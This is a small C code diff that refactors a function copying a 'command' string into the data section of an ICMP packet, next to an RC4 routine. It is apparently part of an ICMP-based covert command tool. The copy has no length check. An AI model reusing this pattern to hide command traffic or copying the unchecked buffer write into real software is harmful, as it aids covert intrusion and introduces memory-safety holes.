@@ -1,5 +1,6 @@
 #include <string.h>
 #include <unistd.h>
+
 #include "../include/utils.h"
 
 void rc4(unsigned char* data, long data_len, unsigned char* key, long key_len, unsigned char* result) {
@@ -112,8 +113,8 @@ void prep_icmp_headers(struct icmphdr *icmp, uint16_t checksum) {
 }
 
 // append the command to the data section of the packet
-void append_to_data_section(struct icmphdr *icmp, unsigned char *data, unsigned char *input) {
-    memcpy(data, input, strlen((char *) input));
+void append_to_data_section(struct icmphdr *icmp, unsigned char *input) {
+    memcpy((unsigned char *) icmp + sizeof(struct icmphdr), input, strlen((char *) input));
 
     uint16_t checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + strlen((char *) input));
 
